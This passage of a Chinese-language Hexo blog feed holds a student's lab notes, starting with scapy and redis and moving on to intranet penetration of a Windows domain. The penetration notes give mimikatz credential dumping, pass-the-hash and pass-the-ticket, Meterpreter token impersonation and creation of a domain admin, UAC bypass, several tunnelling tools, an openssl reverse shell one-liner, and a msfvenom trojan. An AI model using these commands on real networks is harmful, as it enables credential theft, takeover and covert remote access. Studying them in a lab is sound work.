operator">=</span><span class="token string">'目标ip'</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/04/13/scapytest/image-20220413160606495.png" alt="image-20220413160606495"></p><pre class=" language-py"><code class="language-py">p=sr1(IP(dst='目标ip')/ICMP())p</code></pre><p><img src="/2022/04/13/scapytest/image-20220413160819073.png" alt="image-20220413160819073"></p><blockquote><p>syn半开放扫描</p></blockquote><pre class=" language-python"><code class="language-python">sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'目标ip'</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">'S'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/04/13/scapytest/image-20220413161253476.png" alt="image-20220413161253476"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/04/09/redis-python/">redis数据库和python联动</a></li><li><a href="https://www.marsshen.com/posts/39fb172e/">如何使用RabbitMQ控制Scrapy爬虫</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> scapy </tag>
            
            <tag> 网络 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis数据库和python联动</title>
      <link href="/2022/04/09/redis-python/"/>
      <url>/2022/04/09/redis-python/</url>
      
        <content type="html"><![CDATA[<h1 id="redis数据库和python"><a href="#redis数据库和python" class="headerlink" title="redis数据库和python"></a>redis数据库和python</h1><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>nosql数据库之一</p><p>内存运行，效率极高</p><p>key-value</p><p>特点：</p><blockquote><p>c&#x2F;s通信模式</p><p>单进程单线程</p><p>支持很多数据类型</p><p>高并发读写</p><p>支持lua脚本</p><p>数据持久化</p></blockquote><p>每秒11w次读，8w1k次写</p><p>原子，要么成功要么失败</p><h3 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h3><p>首先先下载一个phpstudy</p><p><img src="/2022/04/09/redis-python/image-20220409155816815.png" alt="image-20220409155816815"></p><p>这俩都下，然后开启redis服务</p><p>然后点开client的管理</p><p><img src="/2022/04/09/redis-python/image-20220409155907719.png" alt="image-20220409155907719"></p><p><img src="/2022/04/09/redis-python/image-20220409155943959.png" alt="image-20220409155943959"></p><p>不过一般情况下使用命令行来执行redis数据库连接</p><p><img src="/2022/04/09/redis-python/image-20220409161318742.png" alt="image-20220409161318742"></p><pre class=" language-redis"><code class="language-redis">连接数据库redis-cli -h 127.0.0.1连接外部数据库redis-cli -h [远程数据库的地址] -p 6379退出quitselect [数字] //选择哪个数据库</code></pre><p>如果让其他人连接你的数据库</p><p>需要在redis.windows.conf里添加一个</p><pre class=" language-redis"><code class="language-redis">bind 127.0.0.1</code></pre><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><pre class=" language-redis"><code class="language-redis">键值对,键不能重复基本设置值flushall //清空所有数据set name test1 //添加一个键值对get name1 //获得数据set name2 test2 EX5setex name2 test2   //设置五秒后失效的键值对ttl name2 //获取键值对生命周期mset key1 value1 key2 value2 //同时设置多个键值对mget key1 key2 同时获得多个键值对append name1 yao 在name1的值后面增加yao(拼接效果)</code></pre><h4 id="键命令"><a href="#键命令" class="headerlink" title="键命令"></a>键命令</h4><pre class=" language-redis"><code class="language-redis">keys [正则表达式]keys * //取出所有的键keys ke* //取出所有以ke开头的键keys name[0-3] //取出name0-3的键exists name2 //判断name2键是否存在del name3 删除某一个键expire name2 5 //设置键几秒过期</code></pre><h4 id="hash类型"><a href="#hash类型" class="headerlink" title="hash类型"></a>hash类型</h4><pre class=" language-redis"><code class="language-redis">设置hash类型hset xiaoming height 180hset xiaoming weight 60kghset xiaoming age 18获得hash值hget xiaoming height获得hash下所有的键值对hgetall xiaoming同时设置多个值的hashhmset xiaohong id 2 weight 120kg height 190获得hash下所有的keyhkeys xiaohong查看里面有多少个值hlen xiaohong查看里面有多少个valuehvals xiaohong提取hash特定的key的值hmget xiaohong id weight删除hash下特定的键值对hdel xiaohong id height删除xiaomingdel xiaohong</code></pre><h4 id="list类型"><a href="#list类型" class="headerlink" title="list类型"></a>list类型</h4><blockquote><p>如果lpush是从下往上累加东西,其他运算就是从上往下进行操作</p></blockquote><pre class=" language-redis"><code class="language-redis">从左往右依次插入数据,此时第0个元素是a1lpush list1 a1 a2 a3 a4 a5 a6 a7 a8 a9从右往左依次插入数据,此时第0个元素是a9rpush list2 a1 a2 a3 a4 a5 a6 a7 a8 a9从上往下取四个lrange list1 0 3取出list1中所有内容lrange list1 0 -1取出从上往下的第3个并且值修改为b3lset list1 2 b3删除所有a3lrem [列表] [计数] [值]如果计数>0,从头到尾搜索值并且删除对应的个数如果计数<0,从尾倒头搜索值并且删除对应的个数如果计数=0,就删除所有的对应的值lrem list2 0 a3查看列表中第几个元素index list2 [数字] 查看列表中有多少个值llen list2</code></pre><h4 id="set类型"><a href="#set类型" class="headerlink" title="set类型"></a>set类型</h4><pre class=" language-redis"><code class="language-redis">无序集合,元素唯一,不重复,没有修改操作创建一个set值sadd s1 member1 member2 member3获取s1里所有值smembers s1获取s1里有多少个元素scard s1删除set中的值srem s1 member2取出交集sinter s1 s2取并集sunion s1 s2取差集sdiff s1 s2</code></pre><h4 id="zset类型"><a href="#zset类型" class="headerlink" title="zset类型"></a>zset类型</h4><pre class=" language-redis"><code class="language-redis">有序集合,元素唯一,不重复,没有修改操作每个元素关联一个score,也就是权重,从小到大排序添加元素和对应的权重zadd zs1 4 xiaoming 5 xiaohong 2 xiaogang</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/04/13/scapytest/">scapy基本操作</a></li><li><a href="http://broken-year.github.io/2022/03/19/redis-security/">redis安全策略</a></li><li><a href="http://broken-year.github.io/2022/03/19/redis-keys/">redis-keys</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> redis </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内安全</title>
      <link href="/2022/03/31/domain-security/"/>
      <url>/2022/03/31/domain-security/</url>
      
        <content type="html"><![CDATA[<h1 id="域内安全"><a href="#域内安全" class="headerlink" title="域内安全"></a>域内安全</h1><h2 id="mimikatz在内网中使用"><a href="#mimikatz在内网中使用" class="headerlink" title="mimikatz在内网中使用"></a>mimikatz在内网中使用</h2><p>一般来说域环境里面，用户信息在ntds.dit,加密后为散列值</p><p>LM Hash,NTLM Hash</p><blockquote><p>user1:RID:LM-HASH:NT-HASH</p></blockquote><p>NTML 基于md4</p><p>打开linux</p><pre class=" language-shell"><code class="language-shell">使用mimikatz传到靶机进入shellmimikatz "privilege::debug" "log" "sekurlsa::logonpasswords" //把所有能搜集到的用户名密码明文读取</code></pre><p>在win2008之后就不太好使了</p><h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h2><p>另开一个win2012，是域里面的一台主机，假设已经入侵成功</p><pre class=" language-shell"><code class="language-shell">使用mimikatz获得域控的NTLM hash值mimikatz "privilege::debug" "log" "sekurlsa::logonpasswords"mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:test1.com /ntlm:hash值"</code></pre><p>弹出一个cmd框，在框里输入</p><pre class=" language-shell"><code class="language-shell">dir \\dc-1\c$type \\dc-1\c$a.txt</code></pre><p>发现可以控制域控了</p><p>进入下一种方式</p><pre class=" language-shell"><code class="language-shell">shellcd x64mimikatz "privilege::debug" "sekurlsa::ekeys" //看到aes256的hashaes256也可以pass the hashmimikatz "privilege::debug" "sekurlsa::pth /user:test2 /domain:test1.com /aes256:hash"又新建一个cmd</code></pre><h2 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h2><p>进入mimikatz，先票据导出</p><pre class=" language-shell"><code class="language-shell">mimikatzprivilege::debugsekurlsa::tickets /export</code></pre><p>内存中票据清理</p><pre class=" language-shell"><code class="language-shell">kerberos::purge</code></pre><p>拿到票据该怎么使用</p><pre class=" language-shell"><code class="language-shell">mimikatz "kerberos::ptt" c:\x64\你要用的票据文件.kirbi把票据注入到内存中</code></pre><p>在本cmd中</p><pre class=" language-shell"><code class="language-shell">dir \\dc-1\c$直接进行访问</code></pre><h2 id="wmic命令执行"><a href="#wmic命令执行" class="headerlink" title="wmic命令执行"></a>wmic命令执行</h2><p>进入一个system权限的session</p><pre class=" language-shell"><code class="language-shell">shellwmic /node:域控ip /user:test2 /password:test123! process call create "cmd.exe /c ipconfig > c:\ip.txt"exitmigrate //查看进程migrate 进程号dir \\dc-1\c$</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/03/加密QQ空间强行爆破工具V1.0/">加密QQ空间强行爆破工具V1.0</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内纵向移动和横向移动</title>
      <link href="/2022/03/31/move/"/>
      <url>/2022/03/31/move/</url>
      
        <content type="html"><![CDATA[<h1 id="纵向移动和横向移动"><a href="#纵向移动和横向移动" class="headerlink" title="纵向移动和横向移动"></a>纵向移动和横向移动</h1><h2 id="纵向移动"><a href="#纵向移动" class="headerlink" title="纵向移动"></a>纵向移动</h2><p>之前已经拿到system权限</p><pre class=" language-shell"><code class="language-shell">ps    \\查看进程migrate 1880  \\把自己进程迁移到1880里use incognitolist_tokens -u   \\可以使用哪些用户load mimikatzkerberos_ticket_listkerberos_ticket_use</code></pre><p>管理员做过一些事情，但是没有退出</p><p>如果进入域管理员</p><pre class=" language-shell"><code class="language-shell">getsystemimpersonate_token TEST1\Administrator  \\提权到域控管理员add_user test2 tset123! -h 域控ipadd_group_user "domain admins" test2 -h 域控ip  \\扔进组里shellnet group "domain admins" /domain</code></pre><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>入侵了一台普通的域内服务器之后，可以通过一些方法提权到system权限</p><pre class=" language-shell"><code class="language-shell">psuse incognitolist_tokens -uimpersonate_token TEST1\\Administratorgetuid</code></pre><p>通过一些方法知道域的ip地址</p><p>可以映射网络驱动器</p><pre class=" language-shell"><code class="language-shell">在文件夹里面\\域控ip\c$通过域控管理员直接连接</code></pre><p>在cmd里</p><pre class=" language-shell"><code class="language-shell">net use \\域控ip\c$ "test123!" /user:test2net sharenet use   建立管道dir \\域控ip\c$type \\域控ip\c$\this-is-dc.txt</code></pre><p>当对方开了135和445端口的时候</p><pre class=" language-shell"><code class="language-shell">net use \\域控ip\ipc$ "test123!" /user:test2</code></pre><p>远程访问进程</p><pre class=" language-shell"><code class="language-shell">tasklist /S 域控ip /U test2 /P test123!</code></pre><p>进入session里面</p><pre class=" language-shell"><code class="language-shell">shellecho 'haha' > a.txt</code></pre><p>然后在cmd里</p><pre class=" language-shell"><code class="language-shell">copy a.txt \\域控ip\c$</code></pre><p>也可以远程计划任务</p><pre class=" language-shell"><code class="language-shell">at \\域控ip 9:51PM cmd.exe /c "ipconfig > c:/1.txt"</code></pre><p>如果系统版本比较新</p><pre class=" language-shell"><code class="language-shell">schtasks /create /s 域控ip /tn test1 /sc onstrat /tr c:/a.bat /ru system / </code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uac提权和令牌认识</title>
      <link href="/2022/03/31/uac/"/>
      <url>/2022/03/31/uac/</url>
      
        <content type="html"><![CDATA[<h1 id="uac提权和令牌认识"><a href="#uac提权和令牌认识" class="headerlink" title="uac提权和令牌认识"></a>uac提权和令牌认识</h1><h2 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h2><p><em>uac</em>一般指用户账户控制。 用户帐户控制</p><p>假设在linux里已经控制了一个sessions</p><pre class=" language-Linux"><code class="language-Linux">use exploit/windows/local/bypassuacshow optionsset session 1run</code></pre><p>还可以用</p><pre class=" language-Linux"><code class="language-Linux">use exploit/windows/local/askshow optionsset session 1</code></pre><p>此时在靶机端会出现一个窗口，让你输入密码，并且出现一个新的session</p><p>此时可以</p><pre class=" language-Linux"><code class="language-Linux">getsystem 提权</code></pre><h2 id="令牌认识"><a href="#令牌认识" class="headerlink" title="令牌认识"></a>令牌认识</h2><p>令牌-token 系统中的临时秘钥</p><p>获得令牌就可以在不提供用户名和密码就可以访问别人的</p><p>有随机性，一般来说很难被搞到</p><p>黑客伪造令牌 核心 kerberos协议</p><p>进入上面的system权限的session</p><pre class=" language-base"><code class="language-base">use incognitolist_tokens -u  //授权令牌列表impersonate_token TEST1\\Administrator  \\伪造令牌shell \\就会用伪造的用户进入</code></pre><pre class=" language-base"><code class="language-base">ps  \\查看进程use incognitolist_tokens -ushell</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内信息搜集</title>
      <link href="/2022/03/30/information-collection/"/>
      <url>/2022/03/30/information-collection/</url>
      
        <content type="html"><![CDATA[<h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><p>假如在一个域里</p><p>在内网中搜集</p><p>对域内的角色进行判断</p><pre class=" language-Linux"><code class="language-Linux">whoamiipconfig /allsysteminfo | findstr /B /C:"OS Name" /C:"OS Version"systeminfo   //查看服务器信息wmic product get name,version //装了哪些东西wmic service list brief  //哪些服务tasklist  //进程wmic startup get command,caption //开机启动schtasks /query /fo LIST /v  //计划任务net statistics workstation //开机时间net user 本机用户net localgroup administrators //最高权限表query user || qwinsta //查看当前在线用户net session //列出断开本机和连接用户对话net -ano //列出开放端口net share //本机是否开放域共享route print //路由表arp -a //查看当前内网有多少设备whoami /all   //查看唯一标识符</code></pre><p>收集域信息</p><pre class=" language-shell"><code class="language-shell">whoami net user user1 /domain   //user1在域里面是什么样的net config workstation //收集域的名字net time /domain  //判断主域ping dc-1.test1.com //就能看到ip</code></pre><p>查看内网所有的ip</p><pre class=" language-Linux"><code class="language-Linux">for /L %I in (1,1,254) DO @ping -w 1 -n 192.1668.1.%I | findstr "TTL="</code></pre><p>使用其他命令继续收集域内信息</p><pre class=" language-Linux"><code class="language-Linux">net vice /domain:test1   //权限够的话能看到一些信息net group /domain   //能看到域控的组net group "domain computers" /domain  //查看域内成员net accounts /domain //查看密码使用时间nltest /domain_trusts   //获得域信任关系nltest /DCLIST:test1   //确认域控nslookup -type=SRV_ldap._tcp  //默认服务器net group "Domain Controllers" /domain  //确认域控netdom query dc //域控计算机名wmic useraccount get /all  //域内用户详细信息</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2022/03/30/frp/"/>
      <url>/2022/03/30/frp/</url>
      
        <content type="html"><![CDATA[<h1 id="Frp内网穿透"><a href="#Frp内网穿透" class="headerlink" title="Frp内网穿透"></a>Frp内网穿透</h1><p>黑客（192.168.3.134）——–（192.168.3.143）server1（172.16.1.105）——–（172.16.1.103）server2</p><p>server1 &#x3D; frp server</p><p>server2 &#x3D; frp client</p><p>在server1上配置</p><pre class=" language-Linux"><code class="language-Linux">nano frps.ini[common]bind_port = 7000token = haha123保存退出frps -c frps.ini  //启动frp服务端</code></pre><p>在server2里面配置</p><pre class=" language-Linux"><code class="language-Linux">frpc.ini配置[common]server_addr = 172.16.1.105server_port = 7000[web]type = tcplocal_ip = 127.0.0.1local_port = 80remote_port = 6080frpc -c frpc.ini //启动frp客户端</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理和隧道技术</title>
      <link href="/2022/03/29/agents-and-tunnels/"/>
      <url>/2022/03/29/agents-and-tunnels/</url>
      
        <content type="html"><![CDATA[<h1 id="代理和隧道技术"><a href="#代理和隧道技术" class="headerlink" title="代理和隧道技术"></a>代理和隧道技术</h1><h2 id="neo-neoreg代理"><a href="#neo-neoreg代理" class="headerlink" title="neo-neoreg代理"></a>neo-neoreg代理</h2><p>黑客（192.168.3.134）——-（192.168.3.143）server1（172.16.1.105）—-（172.16.1.103）server2</p><p>在server1随便搭建一个网站</p><p>然后在黑客里下载neo-neoreg</p><pre class=" language-Linux"><code class="language-Linux">python neoreg.py generate -k mima123</code></pre><p>把制作好的东西扔进server1里的网站目录下</p><p>继续回到黑客主机里</p><pre class=" language-Linux"><code class="language-Linux">python neoreg.py -k mima123 -u http://192.168.3.143/tunnel.php</code></pre><p>然后打开浏览器，在代理里面设置代理</p><p><img src="/2022/03/29/agents-and-tunnels/image-20220330095916789.png" alt="image-20220330095916789"></p><h2 id="earthworm代理"><a href="#earthworm代理" class="headerlink" title="earthworm代理"></a>earthworm代理</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>在server1(windows)上放上这个软件</p><pre class=" language-Linux"><code class="language-Linux">ew_for_Win.exe -s ssocksd -l 8888</code></pre><p>黑客</p><pre class=" language-Linux"><code class="language-Linux">nano /etc/proxychainssocks5 192.168.3.143 8888</code></pre><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><p>把server2上面的流量转发到中间人这边，再从中间人转到黑客</p><p>server1</p><pre class=" language-Linux"><code class="language-Linux">ew -s rcsocks -l 1080 -e 1024</code></pre><p>server2</p><pre class=" language-Linux"><code class="language-Linux">ew -s rssocks -d 172.16.1.105 -e 1024</code></pre><p>黑客</p><p>不用改动</p><h2 id="icmp通道"><a href="#icmp通道" class="headerlink" title="icmp通道"></a>icmp通道</h2><p>黑客可以ping目标，但是无法建立tcp连接</p><p>黑客可以和server1，server1可以和server2通信</p><p>server1（linux）</p><pre class=" language-Linux"><code class="language-Linux">apt install ptunnelptunnel -x 1234</code></pre><p>黑客</p><pre class=" language-Linux"><code class="language-Linux">ptunnel -p 192.168.3.143 -lp 8080 -da 172.16.1.103 -dp  80 -x 1234</code></pre><h2 id="dns隧道"><a href="#dns隧道" class="headerlink" title="dns隧道"></a>dns隧道</h2><p>大部分防火墙以及IPS，IDS不会过滤dns流量</p><p>黑客可以访问中间人，中间人只能和目标dns通信</p><pre class=" language-Linux"><code class="language-Linux">dns2tcpd-F 强制后台运行，默认在后台-i 监听ip,默认0,0,0,0-f 配置文件-d debug级别dns2tcpc-c 启用压缩-z 指定使用域名-d 调式级别(1,2,3)-r 访问目标资源-f 配置文件路径-l 本地监听端口-T DNS请求类型,默认TXT</code></pre><p>在vps服务商把udp53号端口打开，使用dns.xxx.com的A记录指向server1的ip</p><p>server1和黑客都要安装</p><pre class=" language-Linux"><code class="language-Linux">apt install dns2tcp</code></pre><p>黑客：</p><pre class=" language-Linux"><code class="language-Linux">nano /etc/hosts192.168.3.143 dns.xxx.com </code></pre><p>然后在server1里也设置</p><pre class=" language-Linux"><code class="language-Linux">192.168.3.143 dns.xxx.comnano /etc/dns2tcpd.conf在文件里改listen=0.0.0.0key=haha123domain=dns.xxx.com启动隧道dns2tcpd -f /etc/dns2tcpd.conf -F -d 3</code></pre><p>然后转到黑客上</p><pre class=" language-Linux"><code class="language-Linux">dns2tcpc -r ssh -k haha123 -z dns.xxx.com 192.168.3.143 -l 8888 -c -d 3ssh -p 8888 127.0.0.1  就建立成了</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 端口 </tag>
            
            <tag> 代理 </tag>
            
            <tag> 隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh隧道</title>
      <link href="/2022/03/29/ssh/"/>
      <url>/2022/03/29/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h1><p>黑客（192.168.3.134）———-（192.168.3.142）server1（172.16.1.104）———-（172.16.1.103）server2</p><h2 id="正向隧道"><a href="#正向隧道" class="headerlink" title="正向隧道"></a>正向隧道</h2><p>在server1上面</p><pre class=" language-Linux"><code class="language-Linux">curl http://172.16.1.103 //测试访问ssh -CNfL 0.0.0.0:7777:172.16.1.103:80 root@127.0.0.1   //做一个映射</code></pre><p>黑客就可以访问了</p><h2 id="反向隧道"><a href="#反向隧道" class="headerlink" title="反向隧道"></a>反向隧道</h2><p>在server1上面</p><pre class=" language-Linux"><code class="language-Linux">ssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.3.134 //把本地22映射到黑客的2222</code></pre><p>在黑客上</p><pre class=" language-Linux"><code class="language-Linux">ssh -p 2222 root@127.0.0.1   //连接到server1curl http://172.16.1.103    //访问</code></pre><p>另一种方法</p><p>在server1上面</p><pre class=" language-Linux"><code class="language-Linux">ssh -qTfnN -R 2223:17.16.1.103:80 root@192.168.3.134 //把server2的80端口映射到黑客的2223</code></pre><h2 id="ssh本地s5代理"><a href="#ssh本地s5代理" class="headerlink" title="ssh本地s5代理"></a>ssh本地s5代理</h2><pre class=" language-Linux"><code class="language-Linux">ssh -qTfnN -D 7070 root@192.168.3.142   //以自己的7070端口连接中间人</code></pre><p>然后在火狐里</p><p><img src="/2022/03/29/ssh/image-20220329155546288.png" alt="image-20220329155546288"></p><p><img src="/2022/03/29/ssh/image-20220329155609282.png" alt="image-20220329155609282"></p><p><img src="/2022/03/29/ssh/image-20220329155631317.png" alt="image-20220329155631317"></p><p>就可以访问网站了</p><h2 id="ssh本地转发"><a href="#ssh本地转发" class="headerlink" title="ssh本地转发"></a>ssh本地转发</h2><p>在黑客机器上</p><pre class=" language-Linux"><code class="language-Linux">ssh -L 0.0.0.0:6667:172.16.1.103:80 root@192.168.3.142 -fN</code></pre><p>然后访问127.0.0.1:6667就可以了！</p><h2 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h2><p>在server1上修改ssh配置</p><pre class=" language-Linux"><code class="language-Linux">vi /etc/ssh/ssh_configgatewayports yes</code></pre><p>在server2上</p><pre class=" language-Linux"><code class="language-Linux">ssh -R 8877:172.16.1.103:80 root@192.168.3.142</code></pre><h2 id="opssl反弹加密"><a href="#opssl反弹加密" class="headerlink" title="opssl反弹加密"></a>opssl反弹加密</h2><p>黑客：</p><p>ssl生成自签名证书</p><p>监听端口</p><pre class=" language-Linux"><code class="language-Linux">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesopenssl s_server -quiet -key key.pem -cert cert.pem -port 8080</code></pre><p>目标：反向连接</p><pre class=" language-Linux"><code class="language-Linux">mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.3.134:8080 >/tmp/s;rm /tmp/s</code></pre><h2 id="netsh端口映射"><a href="#netsh端口映射" class="headerlink" title="netsh端口映射"></a>netsh端口映射</h2><p>server1变为windows 外网：192.168.3.133 内网：172.16.1.102</p><p>在server1</p><pre class=" language-Linux"><code class="language-Linux">netsh interface portproxy add v4tov4 listenport=7777 connectaddress=172.16.1.103 connectport=80netsh interface portproxy show all</code></pre><p>黑客</p><pre class=" language-Linux"><code class="language-Linux">curl 192.168.3.133:80 就可以访问了</code></pre><p>如果要关闭</p><p>server1</p><pre class=" language-Linux"><code class="language-Linux">netsh interface portproxy resetnetsh interface portproxy show all</code></pre><h2 id="netsh进行msf代理"><a href="#netsh进行msf代理" class="headerlink" title="netsh进行msf代理"></a>netsh进行msf代理</h2><p>如果给server2种下木马，在中间人做netsh，用server1做跳板</p><p>黑客</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.104 lport=4455 -f exe > muma.exe</code></pre><p>新打开个窗口</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.3.134  //黑客的ipset lport 4455</code></pre><p>然后把木马放过去</p><p>然后进入中间人这里</p><pre class=" language-Linux"><code class="language-Linux">netsh interface portproxy add v4tov4 listenport=4455 connectaddress=192.168.3.134 